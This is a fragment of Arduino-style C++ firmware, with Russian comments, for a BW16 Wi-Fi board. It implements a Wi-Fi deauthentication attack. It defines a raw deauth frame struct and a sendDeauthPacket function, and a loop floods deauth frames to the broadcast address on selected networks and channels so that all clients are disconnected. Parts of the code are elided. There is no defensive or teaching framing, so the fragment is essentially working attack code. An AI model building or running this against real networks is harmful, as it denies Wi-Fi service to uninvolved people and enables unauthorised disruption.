...
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"  // Вместо packet-injection
#include "wifi_util.h"
...
// Структура deauth-пакета
struct DeauthFrame {
    uint16_t frameControl = 0x00C0;  // Deauthentication
    uint16_t duration = 0x013A;
    uint8_t destAddr[6];              // MAC жертвы
    uint8_t srcAddr[6];                // MAC роутера
    uint8_t bssid[6];                  // BSSID роутера
    uint16_t seqControl = 0x0000;
    uint16_t reasonCode = 0x0002;      // Reason code (2 = предыдущая аутентификация недействительна)
...
// Функция отправки deauth-пакета для BW16
bool sendDeauthPacket(uint8_t* apMac, uint8_t* clientMac, uint16_t reason) {
    DeauthFrame deauth;
    
    // Заполняем адреса
    memcpy(deauth.destAddr, clientMac, 6);
    memcpy(deauth.srcAddr, apMac, 6);
    memcpy(deauth.bssid, apMac, 6);
    deauth.reasonCode = reason;
    
    // Отправляем через wifi_cust_tx
    return wifi_send_packet(0, (uint8_t*)&deauth, sizeof(deauth)) == 0;
}
...
void setup() {
  // Пины для RGB светодиода (уточните для вашей платы)
  ...
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto& group : deauth_channels) {
      ...
      if (ch == chs_idx[current_ch_idx]) {
        ...
        // Широковещательный MAC для деаутентификации всех клиентов
        ...
        for (int i = 0; i < frames_per_deauth; i++) {
          ...
          for (int idx : networks) {
            ...
            // Отправляем deauth-пакет
            sendDeauthPacket(deauth_bssid, broadcast, deauth_reason);
            sent_frames++;
            delay(1); // Небольшая задержка между пакетами
          }
          delay(send_delay);
          if (led) {
            digitalWrite(LED_B, LOW);
